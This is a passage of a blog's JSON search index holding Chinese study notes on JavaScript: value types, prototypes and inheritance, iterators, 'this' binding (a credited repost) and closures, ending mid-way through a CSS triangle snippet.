而原始值不能有属性，原始值的初始化只使用原始字面量形式，如果使用new关键字则JavaScript会创建一个Object类型的实例， 12345678let name1=&quot;Nicholas&quot;;let name2=new String(&quot;Matt&quot;);name1.age=27;name2.age=26;console.log(name1.age);//undefinedconsole.log(name2.age);//26console.log(typeof name1);//stringconsole.log(typeof name2);//object 复制值通过变量把一个原始值赋值到另一个变量时，原始值会被复制得到新变量的位置。 12let num1=5;let num2=num1; num1和num2相互独立，num2是num1的副本 当把引用值从一个变量赋值给另一个变量时，存储在变量中的值也会被复制到新变量所在位置，区别在于：这里复制的值时一个指针，它指向存储在堆内存中的对象。两个变量实际上指向同一个对象。 1234let obj1=new Object();let obj2=obj1;obj1.name=&quot;Nic&quot;;console.log(obj2.name);//Nic 传递参数ECMAScript中所有函数的参数都是按值传递，这意味着函数外的值会被复制到函数内部参数中，就像一个变量赋值到另一个变量一样，如果是原始值，那么就跟原始值变量的复制一样，如果是引用值就和引用值的变量复制一样。 123456789function addTen(num)&#123;//count的值被复制到参数num,函数内部num+10但不会影响函数外部的原始变量count num+=10; return num; &#125;let count=20;let res=addTen(count);console.log(count);//20，没有变化console.log(res);//30 如果是对象： 12345678function setName(obj)&#123; obj.name=&quot;Nic&quot;；//此时多了一个obj指针指向person,将name改为Nic obj=new Object();//又创建一个指针，指向内存其他位置 obj.name=&quot;Greg&quot;;//函数调用结束，obj被销毁&#125;let person=new Object();setName(person);console.log(person.name);//&#x27;Nic&#x27; typeoftypeof用来判断一个变量是否为原始类型，即判断一个变量是否为字符串，数字，布尔值或undefined的最好方式，值为对象null,那么typeof返回Object typeof虽然对原始值很有用，但是对引用值用处不大，我们通常关心一个值是不是对象，而是想知道它是什么类型的对象。 instanceof如果变量是给定引用类型的实例，则instanceof操作符返回true 1console.log(person instanceof Object);//变量person是Object吗 按照定义所有引用值都是Object的实例，因此通过instanceof检测的任何引用值和Object构造函数都会返回true。如果，使用instanceof检测原始值，则始终会返回false,因为原始值不是对象。","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"原始值与引用值及确定类型","slug":"确定类型","date":"2022-04-14T07:04:04.000Z","updated":"2022-04-15T01:20:57.283Z","comments":true,"path":"2022/04/14/确定类型/","link":"","permalink":"https://coloey.github.io/2022/04/14/%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"原始值和引用值ECMAScript变量可以包含两种不同类型的数据：原始值和引用值，原始值就是最简单的数据：Undefined,Null,Boolean,Number,String,Symbol,保存原始值的变量是按值访问的，因为我们操作的就是存储在变量中的实际值。 引用值是保存在内存中的对象，JavaScript不允许直接访问内存位置，操作对象时，实际上操作的对该对象的引用，而非实际的对象本身，因此，保存引用值的变量是按引用访问的。 区别动态属性引用值可以随时添加，修改删除属性。 而原始值不能有属性，原始值的初始化只使用原始字面量形式，如果使用new关键字则JavaScript会创建一个Object类型的实例， 12345678let name1=&quot;Nicholas&quot;;let name2=new String(&quot;Matt&quot;);name1.age=27;name2.age=26;console.log(name1.age);//undefinedconsole.log(name2.age);//26console.log(typeof name1);//stringconsole.log(typeof name2);//object 复制值通过变量把一个原始值赋值到另一个变量时，原始值会被复制得到新变量的位置。 12let num1=5;let num2=num1; num1和num2相互独立，num2是num1的副本 当把引用值从一个变量赋值给另一个变量时，存储在变量中的值也会被复制到新变量所在位置，区别在于：这里复制的值时一个指针，它指向存储在堆内存中的对象。两个变量实际上指向同一个对象。 1234let obj1=new Object();let obj2=obj1;obj1.name=&quot;Nic&quot;;console.log(obj2.name);//Nic 传递参数ECMAScript中所有函数的参数都是按值传递，这意味着函数外的值会被复制到函数内部参数中，就像一个变量赋值到另一个变量一样，如果是原始值，那么就跟原始值变量的复制一样，如果是引用值就和引用值的变量复制一样。 123456789function addTen(num)&#123;//count的值被复制到参数num,函数内部num+10但不会影响函数外部的原始变量count num+=10; return num; &#125;let count=20;let res=addTen(count);console.log(count);//20，没有变化console.log(res);//30 如果是对象： 12345678function setName(obj)&#123; obj.name=&quot;Nic&quot;；//此时多了一个obj指针指向person,将name改为Nic obj=new Object();//又创建一个指针，指向内存其他位置 obj.name=&quot;Greg&quot;;//函数调用结束，obj被销毁&#125;let person=new Object();setName(person);console.log(person.name);//&#x27;Nic&#x27; typeoftypeof用来判断一个变量是否为原始类型，即判断一个变量是否为字符串，数字，布尔值或undefined的最好方式，值为对象null,那么typeof返回Object typeof虽然对原始值很有用，但是对引用值用处不大，我们通常关心一个值是不是对象，而是想知道它是什么类型的对象。 instanceof如果变量是给定引用类型的实例，则instanceof操作符返回true 1console.log(person instanceof Object);//变量person是Object吗 按照定义所有引用值都是Object的实例，因此通过instanceof检测的任何引用值和Object构造函数都会返回true。如果，使用instanceof检测原始值，则始终会返回false,因为原始值不是对象。 对象标识和相等判定ES6之前： 12console.log(+0===-0);//truecosole.log(NAN===NAN);//false ES6中的object.is()与===很像，但同时考虑了上述边界情形，这个方法接收两个参数： 1234console.log(Object.is(true,1));//falseconsole.log(Object.is(&#123;&#125;,&#123;&#125;));//falseconsole.log(Object.is(+0,-0));//falseconsole.log(Object.is(NAN,NAN));//true 检查超过两个值是否相等 1234function recursiveEqual(x,...rest)&#123; return Object.is(x,rest[0])||(rest.length&lt;2||recursiveEqual(...rest)); &#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"原型模式","slug":"原型模式","date":"2022-04-13T14:03:03.000Z","updated":"2022-04-14T09:58:53.264Z","comments":true,"path":"2022/04/13/原型模式/","link":"","permalink":"https://coloey.github.io/2022/04/13/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"构造函数构造函数也是函数，与普通函数唯一区别就是调用方式不同。任何函数只要使用new操作符调用就是构造函数，而不适用new操作符调用的函数就是普通函数。 理解原型只要创建一个函数，就会按照特定的规则为这个函数创建一个prototype属性（指向原型对象），默认情况下，所有原型对象会自动获得一个名为constructor指向Person 123456789101112131415161718192021222324function Person()&#123;&#125; console.log(typeof Person.prototype); console.log(Person.prototype); //正常原型链都会终止于Object的原型对象 //Object原型的原型是null console.log(Person.prototype.__proto__===Object.prototype);//true console.log(Person.prototype.__proto__.constructor===Object);//true console.log(Person.prototype.__proto__.__proto__===null);//true console.log(Person.prototype.__proto__);//true let person1=new Person(),person2=new Person(); //构造函数，原型对象和实例是3个完全不同的对象 console.log(person1!==Person);//true console.log(person1!==Person.prototype);//true console.log(Person.prototype!==Person);//true //实例通过__proto__链接到原型对象，它实际上指向隐藏特性[[Prototype]] //实例与构造函数没有联系，与原型对象有直接联系 console.log(person1.__proto__===Person.prototype); console.log(person1.__proto__.constructor===Person); //同一个构造函数创建的两个实例共享同一个原型对象 console.log(person1.__proto__===person2.__proto__); //instanceof检查实例的原型链中是否包含指定构造函数的原型 console.log(person1 instanceof Person);//true console.log(person1 instanceof Object);//true console.log(Person.prototype instanceof Object);//true Person构造函数，Person原型对象和Person现有实例的关系如上：Person.prototype指向原型对象，因此Person.prototye.constructor指回Person构造函数。原型对象包含constructor属性和其他后来添加的属性。Person的两个实例person1,person2有一个内部属性指回Person.prototype,而且两者和构造函数没有直接联系。person1.sayName()可以正常调用，这是由于对象属性查找机制的原因 虽然不是所有实现都对外暴露[[Prototype]]，但可以使用isPrototypeOf()方法确定两个对象之间的关系，本质上isPrototypeOf()会在传入参数的[[Prototype]]指向调用它的对象时返回true 12console.log(Person.prototype.isprototypeOf(person1));//trueconsole.log(Person.prototype.isprototypeOf(person2));//true Object类型有一个方法叫Object.getPrototypeOf(),返回参数的内部特性[[Prototype]]的值 12console.log(Object.getPrototypeOf(person1)==Person.prototype);//trueconsole.log(Object.getPrototypeOf(person1).name); 使用Object.getPrototypeOf()可以取得一个对象的原型 Object类型还有一个setPrototypeOf()方法，可以向实例的私有特性[[Prototype]]写入一个新值，这样就可以重写一个对象的原型继承关系 12345678910let biped=&#123; numLegs:2 &#125;; let person=&#123; name:&#x27;Matt&#x27; &#125;; Object.setPrototypeOf(person,biped); console.log(person.name); console.log(person.numLegs); console.log(Object.getPrototypeOf(person)===biped); Object.setPrototypeOf()可能会严重影响代码性能，会涉及所有访问了哪些修改过[[Prototype]]的对象的代码 可以通过Object.create()创建一个新对象，同时为其指定原型 12345678let biped=&#123; numLegs:2&#125;;let person=Object.create(biped);person.name=&#x27;Matt&#x27;;console.log(person.name);console.log(person.numLegs);console.log(Object.getPrototypeOf(person)===biped);//true 原型层级通过对象访问属性时会按照这个属性名称开始搜索，搜索开始于对象实例本身，如果在实例上发现给定的名称，则返回该名称对应值，如果没有找到这个属性，则搜索会沿着指针进入原型对象，在原型对象找到属性后返回对应值。 比如foo不直接存在于myObject中而是存在于原型链上层时，myObject.foo=”bar”会出现三种情况： 如果在[[Prototype]]链上层存在名为foo的普通数据访问属性，并且writable:true,那就会直接在myObject中添加一个名为foo的新属性，它是屏蔽属性 如果在[[Prototype]]链上层存在foo,但是它是被标记为只读(writable:false)，那么无法修改已有属性或者在myObject上创建屏蔽属性。如果运行在严格模式下，代码会抛出一个错误。否则，这条赋值语句会被忽略。不会发生屏蔽 如果在[[Prototype]]链上层存在foo并且它是一个setter，那就一定会调用这个setter,foo不会添加到myObject，也不会重新定义foo这个setter。 当属性被屏蔽时，可以使用delete删除实例上的这个属性。 1234567891011function Person()&#123;&#125;Person.prototype.name=&#x27;Nicholas&#x27;;Person.prototype.age=29;let person1=new Person();let person2=new Person();person1.name=&quot;Greg&quot;;console.log(person1.name);//&quot;Greg&quot;,来自实例console.log(person2.name);//Nicholas,来自原型delete person1.name;console.log(person1.name);//Nicholas,来自原型 hasOwnProperty()hasOwnProperty()方法用于确定某个属性是在实例上还是原型对象上。这个方法继承自Object，会在属性存在于调用它的对象实例善时返回true in操作符in操作符会在可以通过对象访问指定属性时返回true，无论该属性是在实例上还是在原型上 因此如果要确定某个属性是否在原型上可以同时使用hasOwnProperty()和in操作符 123function hasPrototypeProperty(object,name)&#123; return !Object.hasOwnProperty(name)&amp;&amp;(name in object)&#125; 原型的问题弱化了向构造函数传递初始化参数的能力，会导致所有实例默认取得属性相同的值，以及它的共享特性： 1234567891011121314151617function Person()&#123; Person.prototype=&#123; constructor:Person, name:&#x27;nic&#x27;, age:29, job:&quot;Software Engineer&quot;, friends:[&#x27;Coloey&#x27;,&#x27;Amy&#x27;], sayName()&#123; console.log(this.name) &#125; &#125; &#125; let person1=new Person(); let person2=new Person(); person1.friends.push(&#x27;Van&#x27;); console.log(person1.friends===person2.friends);//true 不同实例应有不同的副本。 原型链原型链是ECMAScript的主要继承方式 1234567891011121314151617function SuperType()&#123; this.property=true; &#125; SuperType.prototype.getSuperValue=function()&#123; return this.property; &#125; function SubType()&#123; this.subproperty=false; &#125; //继承SuperType SubType.prototype=new SuperType(); SubType.prototype.getSubValue=function()&#123; return this.subproperty; &#125; let instance=new SubType(); console.log(instance.getSuperValue());//true console.log(instance.property)//true SubType.prototype是SuperType的实例，因此SubType.prototype指向SuperType.prototype,注意，getSuperValue()方法还在SuperType.prototype对象上，而property是一个实例属性，SubType.prototype是SuperType的实例，因此property存在它上面，由于SubType.peototype的constructor属性被重写指向SuperType,所以instance.constructor也指向SuperType. 原型与继承关系使用instanceOf操作符，如果一个实例的原型链出现过相应狗仔函数则instanceOf返回true 12console.log(instance instanceof Object);console.loh(instance instanceof SubType); 使用isPrototypeOf()方法，原型链上的每个原型都可以调用这个方法，只要原型链上包含这个原型就返回true 123console.log(Object.prototype.isPrototypeOf(instance));//true console.log(SuperType.prototype.isPrototypeOf(instance));//true console.log(SubType.prototype.isPrototypeOf(instance));//true 以对象字面量的方式创建原型方法会破坏之前的原型链： 1234567891011121314151617181920212223function SuperType()&#123; this.property=true; &#125; SuperType.prototype.getSuperValue=function()&#123; return this.property; &#125; function SubType()&#123; this.subproperty=false; &#125; //继承SuperType SubType.prototype=new SuperType();//通过对象字面量添加新方法，会导致上一行无效 SubType.prototype=&#123; getSubValue()&#123; return this.subproperty; &#125;, someOtherMethod()&#123; return false; &#125; &#125; let instance=new SubType(); console.log(instance.getSuperValue());//出错 原型链的问题就是会在原型中包含的引用值会在实例间共享。 1234567891011function SuperType()&#123; this.color=[&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;] &#125; function SubType()&#123; &#125; SubType.prototype=new SuperType(); let intance1=new SubType(); intance1.color.push(&quot;black&quot;); console.log(intance1.color); let instance2=new SubType(); console.log(instance2.color); 盗用构造函数12345678910111213function SuperType()&#123; this.color=[&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;] &#125; function SubType()&#123; //继承SuperType SuperType.call(this); &#125; //SubType.prototype=new SuperType(); let intance1=new SubType(); intance1.color.push(&quot;black&quot;); console.log(intance1.color); let instance2=new SubType(); console.log(instance2.color); 使用call()，SuperType构造函数在为SubType的实例创建的新对象的上下文中执行了，相当于新的SubType对象上运行了SuperType()函数的所有初始化代码 传递参数：123456789101112function SuperType(arr)&#123; this.color=[&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;] arr.forEach(item=&gt;this.color.push(item)); &#125; function SubType()&#123; //继承SuperType SuperType.call(this,[&#x27;black&#x27;]); &#125; let intance1=new SubType(); console.log(intance1.color);//[&#x27;red&#x27;, &#x27;blue&#x27;, &#x27;green&#x27;, &#x27;black&#x27;] let instance2=new SubType(); console.log(instance2.color);//[&#x27;red&#x27;, &#x27;blue&#x27;, &#x27;green&#x27;, &#x27;black&#x27;] 问题：也是使用构造函数模式自定义类型的问题：必须在狗仔函数中定义方法，因此函数不能重用，此外，子类也不能访问父类原型上定义的方法，因此所有类型只能使用构造函数模式。","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"遍历","slug":"遍历","date":"2022-04-13T09:33:34.000Z","updated":"2022-04-13T09:56:49.229Z","comments":true,"path":"2022/04/13/遍历/","link":"","permalink":"https://coloey.github.io/2022/04/13/%E9%81%8D%E5%8E%86/","excerpt":"","text":"for…in 用来遍历对象的可枚举属性列表 forEach(…)用来遍历数组中的所有普值并忽略回调函数的返回值 for…of直接遍历值，会首先向被访问对象请求一个迭代器对象，然后通过调用迭代器对象的next()方法来遍历所有返回值 自定义对象迭代器 1234567891011121314151617181920212223242526272829var myObject=&#123; a:2, b:3 &#125;; Object.defineProperty(myObject,Symbol.iterator,&#123; enumerable:false, writable:false, configurable:true, value:function()&#123; var o=this; var idx=0; var ks=Object.keys(o);//获取Object对象所有键值 return&#123; next:function()&#123;//next是一个函数 return&#123; value:o[ks[idx++]], done:(idx&gt;ks.length) &#125; &#125; &#125; &#125; &#125;) var it=myObject[Symbol.iterator](); it.next(); it.next(); it.next(); for(let v of myObject)&#123; console.log(v); &#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"Object","slug":"Object","date":"2022-04-13T09:25:11.000Z","updated":"2022-04-13T09:25:12.130Z","comments":true,"path":"2022/04/13/Object/","link":"","permalink":"https://coloey.github.io/2022/04/13/Object/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"理解this","slug":"理解this","date":"2022-04-13T07:56:41.000Z","updated":"2022-04-15T13:48:11.444Z","comments":true,"path":"2022/04/13/理解this/","link":"","permalink":"https://coloey.github.io/2022/04/13/%E7%90%86%E8%A7%A3this/","excerpt":"","text":"判断this指向： 由new调用？绑定到新创建的对象 由call或者apply（获得bind)调用?)绑定到指定对象 由上下文对象调用，绑定到那个上下文对象 默认：严格模式下绑定undefined否则绑定全局对象 箭头函数例外，会根据当前词法作用域来决定this,会绑定第一个在作用域链上找到的标识符。 this 的指向在 ES5 中，其实 this 的指向，始终坚持一个原理：this 永远指向最后调用它的那个对象，来，跟着我朗读三遍：this 永远指向最后调用它的那个对象，this 永远指向最后调用它的那个对象，this 永远指向最后调用它的那个对象。记住这句话，this 你已经了解一半了。 下面我们来看一个最简单的例子：例 1： 12345678910var name = &quot;windowsName&quot;;function a() &#123; var name = &quot;Cherry&quot;; console.log(this.name); // windowsName console.log(&quot;inner:&quot; + this); // inner: Window&#125;a();console.log(&quot;outer:&quot; + this) // outer: Window复制代码 这个相信大家都知道为什么 log 的是 windowsName，因为根据刚刚的那句话“this 永远指向最后调用它的那个对象”，我们看最后调用 a 的地方 a();，前面没有调用的对象那么就是全局对象 window，这就相当于是 window.a()；注意，这里我们没有使用严格模式，如果使用严格模式的话，全局对象就是 undefined，那么就会报错 Uncaught TypeError: Cannot read property &#39;name&#39; of undefined。 再看下这个例子：例 2： 12345678var name = &quot;windowsName&quot;;var a = &#123; name: &quot;Cherry&quot;, fn : function () &#123; console.log(this.name); // Cherry &#125;&#125;a.fn();复制代码 在这个例子中，函数 fn 是对象 a 调用的，所以打印的值就是 a 中的 name 的值。是不是有一点清晰了呢~ 我们做一个小小的改动：例 3： 12345678var name = &quot;windowsName&quot;; var a = &#123; name: &quot;Cherry&quot;, fn : function () &#123; console.log(this.name); // Cherry &#125; &#125; window.a.fn();复制代码 这里打印 Cherry 的原因也是因为刚刚那句话“this 永远指向最后调用它的那个对象”，最后调用它的对象仍然是对象 a。 我们再来看一下这个例子：例 4： 12345678var name = &quot;windowsName&quot;;var a = &#123; // name: &quot;Cherry&quot;, fn : function () &#123; console.log(this.name); // undefined &#125;&#125;window.a.fn();复制代码 这里为什么会打印 undefined 呢？这是因为正如刚刚所描述的那样，调用 fn 的是 a 对象，也就是说 fn 的内部的 this 是对象 a，而对象 a 中并没有对 name 进行定义，所以 log 的 this.name 的值是 undefined。 这个例子还是说明了：this 永远指向最后调用它的那个对象，因为最后调用 fn 的对象是 a，所以就算 a 中没有 name 这个属性，也不会继续向上一个对象寻找 this.name，而是直接输出 undefined。 再来看一个比较坑的例子：例 5： 1234567891011var name = &quot;windowsName&quot;;var a = &#123; name : null, // name: &quot;Cherry&quot;, fn : function () &#123; console.log(this.name); // windowsName &#125;&#125;var f = a.fn;f();复制代码 这里你可能会有疑问，为什么不是 Cherry，这是因为虽然将 a 对象的 fn 方法赋值给变量 f 了，但是没有调用，再接着跟我念这一句话：“this 永远指向最后调用它的那个对象”，由于刚刚的 f 并没有调用，所以 fn() 最后仍然是被 window 调用的。所以 this 指向的也就是 window。 由以上五个例子我们可以看出，this 的指向并不是在创建的时候就可以确定的，在 es5 中，永远是this 永远指向最后调用它的那个对象。 再来看一个例子：例 6： 1234567891011var name = &quot;windowsName&quot;;function fn() &#123; var name = &#x27;Cherry&#x27;; innerFunction(); function innerFunction() &#123; console.log(this.name); // windowsName &#125;&#125;fn()复制代码 读到现在了应该能够理解这是为什么了吧(oﾟ▽ﾟ)o。 怎么改变 this 的指向改变 this 的指向我总结有以下几种方法： 使用 ES6 的箭头函数 在函数内部使用 _this = this 使用 apply、call、bind new 实例化一个对象 例 7： 123456789101112131415161718var name = &quot;windowsName&quot;;var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( function () &#123; this.func1() &#125;,100); &#125;&#125;;a.func2() // this.func1 is not a function复制代码 在不使用箭头函数的情况下，是会报错的，因为最后调用 setTimeout 的对象是 window，但是在 window 中并没有 func1 函数。 我们在改变 this 指向这一节将把这个例子作为 demo 进行改造。 箭头函数众所周知，ES6 的箭头函数是可以避免 ES5 中使用 this 的坑的。箭头函数的 this 始终指向函数定义时的 this，而非执行时。，箭头函数需要记着这句话：“箭头函数中没有 this 绑定，必须通过查找作用域链来决定其值，如果箭头函数被非箭头函数包含，则 this 绑定的是最近一层非箭头函数的 this，否则，this 为 undefined”。箭头函数的绑定无法被修改，new也不可以 例 8 ： 123456789101112131415161718var name = &quot;windowsName&quot;;var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( () =&gt; &#123; this.func1() &#125;,100); &#125;&#125;;a.func2() // Cherry复制代码 在函数内部使用 _this = this如果不使用 ES6，那么这种方式应该是最简单的不会出错的方式了，我们是先将调用这个函数的对象保存在变量 _this 中，然后在函数中都使用这个 _this，这样 _this 就不会改变了。例 9： 1234567891011121314151617181920var name = &quot;windowsName&quot;;var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; var _this = this; setTimeout( function() &#123; _this.func1() &#125;,100); &#125;&#125;;a.func2() // Cherry复制代码 这个例子中，在 func2 中，首先设置 var _this = this;，这里的 this 是调用 func2 的对象 a，为了防止在 func2 中的 setTimeout 被 window 调用而导致的在 setTimeout 中的 this 为 window。我们将 this(指向变量 a) 赋值给一个变量 _this，这样，在 func2 中我们使用 _this 就是指向对象 a 了。 使用 apply、call、bind使用 apply、call、bind 函数也是可以改变 this 的指向的，原理稍后再讲，我们先来看一下是怎么实现的： 使用 apply例 10： 12345678910111213141516var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( function () &#123; this.func1() &#125;.apply(a),100); &#125;&#125;;a.func2() // Cherry复制代码 使用 call例 11： 12345678910111213141516var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( function () &#123; this.func1() &#125;.call(a),100); &#125;&#125;;a.func2() // Cherry复制代码 使用 bind例 12： 12345678910111213141516var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( function () &#123; this.func1() &#125;.bind(a)(),100); &#125;&#125;;a.func2() // Cherry复制代码 apply、call、bind 区别刚刚我们已经介绍了 apply、call、bind 都是可以改变 this 的指向的，但是这三个函数稍有不同。 在 MDN 中定义 apply 如下； apply() 方法调用一个函数, 其具有一个指定的this值，以及作为一个数组（或类似数组的对象）提供的参数 语法： fun.apply(thisArg, [argsArray]) thisArg：在 fun 函数运行时指定的 this 值。需要注意的是，指定的 this 值并不一定是该函数执行时真正的 this 值，如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动指向全局对象（浏览器中就是window对象），同时值为原始值（数字，字符串，布尔值）的 this 会指向该原始值的自动包装对象。 argsArray：一个数组或者类数组对象，其中的数组元素将作为单独的参数传给 fun 函数。如果该参数的值为null 或 undefined，则表示不需要传入任何参数。从ECMAScript 5 开始可以使用类数组对象。浏览器兼容性请参阅本文底部内容。 apply 和 call 的区别其实 apply 和 call 基本类似，他们的区别只是传入的参数不同。 call 的语法为： 1fun.call(thisArg[, arg1[, arg2[, ...]]])复制代码 所以 apply 和 call 的区别是 call 方法接受的是若干个参数列表，而 apply 接收的是一个包含多个参数的数组。 例 13： 123456789var a =&#123; name : &quot;Cherry&quot;, fn : function (a,b) &#123; console.log( a + b) &#125;&#125;var b = a.fn;b.apply(a,[1,2]) // 3复制代码 例 14： 123456789var a =&#123; name : &quot;Cherry&quot;, fn : function (a,b) &#123; console.log( a + b) &#125;&#125;var b = a.fn;b.call(a,1,2) // 3复制代码 bind 和 apply、call 区别我们先来将刚刚的例子使用 bind 试一下 123456789var a =&#123; name : &quot;Cherry&quot;, fn : function (a,b) &#123; console.log( a + b) &#125;&#125;var b = a.fn;b.bind(a,1,2)复制代码 我们会发现并没有输出，这是为什么呢，我们来看一下 MDN 上的文档说明： bind()方法创建一个新的函数, 当被调用时，将其this关键字设置为提供的值，在调用新函数时，在任何提供之前提供一个给定的参数序列。 所以我们可以看出，bind 是创建一个新的函数，我们必须要手动去调用： 123456789var a =&#123; name : &quot;Cherry&quot;, fn : function (a,b) &#123; console.log( a + b) &#125;&#125;var b = a.fn;b.bind(a,1,2)() // 3复制代码 ==================================== 更新============================== JS 中的函数调用看到留言说，很多童靴不理解为什么 例 6 的 innerFunction 和 例 7 的 this 是指向 window 的，所以我就来补充一下 JS 中的函数调用。例 6： 1234567891011var name = &quot;windowsName&quot;;function fn() &#123; var name = &#x27;Cherry&#x27;; innerFunction(); function innerFunction() &#123; console.log(this.name); // windowsName &#125;&#125;fn()复制代码 例 7： 123456789101112131415161718var name = &quot;windowsName&quot;;var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( function () &#123; this.func1() &#125;,100); &#125;&#125;;a.func2() // this.func1 is not a function复制代码 函数调用的方法一共有 4 种 作为一个函数调用 函数作为方法调用 使用构造函数调用函数 作为函数方法调用函数（call、apply） 作为一个函数调用比如上面的 例 1：例 1： 12345678910var name = &quot;windowsName&quot;;function a() &#123; var name = &quot;Cherry&quot;; console.log(this.name); // windowsName console.log(&quot;inner:&quot; + this); // inner: Window&#125;a();console.log(&quot;outer:&quot; + this) // outer: Window复制代码 这样一个最简单的函数，不属于任何一个对象，就是一个函数，这样的情况在 JavaScript 的在浏览器中的非严格模式默认是属于全局对象 window 的，在严格模式，就是 undefined。 但这是一个全局的函数，很容易产生命名冲突，所以不建议这样使用。 函数作为方法调用所以说更多的情况是将函数作为对象的方法使用。比如例 2：例 2： 12345678var name = &quot;windowsName&quot;;var a = &#123; name: &quot;Cherry&quot;, fn : function () &#123; console.log(this.name); // Cherry &#125;&#125;a.fn();复制代码 这里定义一个对象 a，对象 a 有一个属性（name）和一个方法（fn）。 然后对象 a 通过 . 方法调用了其中的 fn 方法。 然后我们一直记住的那句话“this 永远指向最后调用它的那个对象”，所以在 fn 中的 this 就是指向 a 的。 使用构造函数调用函数 如果函数调用前使用了 new 关键字, 则是调用了构造函数。这看起来就像创建了新的函数，但实际上 JavaScript 函数是重新创建的对象： 123456789// 构造函数:function myFunction(arg1, arg2) &#123; this.firstName = arg1; this.lastName = arg2;&#125;// This creates a new objectvar a = new myFunction(&quot;Li&quot;,&quot;Cherry&quot;);a.lastName; // 返回 &quot;Cherry&quot;复制代码 这就有要说另一个面试经典问题：new 的过程了，(ಥ_ಥ)这里就简单的来看一下 new 的过程吧：伪代码表示： 12345678var a = new myFunction(&quot;Li&quot;,&quot;Cherry&quot;);new myFunction&#123; var obj = &#123;&#125;; obj.__proto__ = myFunction.prototype; var result = myFunction.call(obj,&quot;Li&quot;,&quot;Cherry&quot;); return typeof result === &#x27;obj&#x27;? result : obj;&#125;复制代码 创建一个空对象 obj; 将新创建的空对象的隐式原型指向其构造函数的显示原型。 使用 call 改变 this 的指向 如果无返回值或者返回一个非对象值，则将 obj 返回作为新对象；如果返回值是一个新对象的话那么直接直接返回该对象。 所以我们可以看到，在 new 的过程中，我们是使用 call 改变了 this 的指向。 作为函数方法调用函数 在 JavaScript 中, 函数是对象。 JavaScript 函数有它的属性和方法。call() 和 apply() 是预定义的函数方法。 两个方法可用于调用函数，两个方法的第一个参数必须是对象本身 在 JavaScript 严格模式(strict mode)下, 在调用函数时第一个参数会成为 this 的值， 即使该参数不是一个对象。在 JavaScript 非严格模式(non-strict mode)下, 如果第一个参数的值是 null 或 undefined, 它将使用全局对象替代。 这个时候我们再来看例 6：例 6： 1234567891011var name = &quot;windowsName&quot;;function fn() &#123; var name = &#x27;Cherry&#x27;; innerFunction(); function innerFunction() &#123; console.log(this.name); // windowsName &#125;&#125;fn()复制代码 这里的 innerFunction() 的调用是不是属于第一种调用方式：作为一个函数调用（它就是作为一个函数调用的，没有挂载在任何对象上，所以对于没有挂载在任何对象上的函数，在非严格模式下 this 就是指向 window 的） 然后再看一下 例 7：例 7： 123456789101112131415161718var name = &quot;windowsName&quot;;var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( function () &#123; this.func1() &#125;,100 ); &#125;&#125;;a.func2() // this.func1 is not a function复制代码 这个简单一点的理解可以理解为“匿名函数的 this 永远指向 window”，你可以这样想，还是那句话this 永远指向最后调用它的那个对象，那么我们就来找最后调用匿名函数的对象，这就很尴尬了，因为匿名函数名字啊，笑哭，所以我们是没有办法被其他对象调用匿名函数的。所以说 匿名函数的 this 永远指向 window。 如果这个时候你要问，那匿名函数都是怎么定义的，首先，我们通常写的匿名函数都是自执行的，就是在匿名函数后面加 () 让其自执行。其次就是虽然匿名函数不能被其他对象调用，但是可以被其他函数调用啊，比如例 7 中的 setTimeout。 转自（作者：sunshine小小倩链接：https://juejin.cn/post/6844903496253177863来源：稀土掘金）","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"理解闭包","slug":"理解闭包","date":"2022-04-13T06:15:41.000Z","updated":"2022-04-13T06:48:13.918Z","comments":true,"path":"2022/04/13/理解闭包/","link":"","permalink":"https://coloey.github.io/2022/04/13/%E7%90%86%E8%A7%A3%E9%97%AD%E5%8C%85/","excerpt":"","text":"123456789function foo()&#123; var a=2; function bar()&#123; console.log(a); &#125; return bar; &#125; var baz=foo(); baz();//2 内部函数bar()能够访问foo()的内部作用域，将bar()函数本身作为值类型传递，调用foo()，我们通常希望整个内部作用域被销毁，然而因为bar()所声明的位置拥有涵盖foo()内部作用域的闭包，使得作用域一直存活，以供bar()在任何时间之后进行引用。内部函数依然持有对外部函数的作用域的引用，这个引用就叫做闭包 总结来说：本质就是上级作用域内变量的生命周期，因为被下级作用域内引用，而没有被释放。就导致上级作用域内的变量，等到下级作用域执行完以后才正常得到释放。","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"CSS画三角","slug":"CSS画三角","date":"2022-04-13T03:36:52.000Z","updated":"2022-04-13T06:17:31.861Z","comments":true,"path":"2022/04/13/CSS画三角/","link":"","permalink":"https://coloey.github.io/2022/04/13/CSS%E7%94%BB%E4%B8%89%E8%A7%92/","excerpt":"","text":"1234567891011div &#123; width:0; height:0; border: 10px solid transparent; border-left-color:pink; 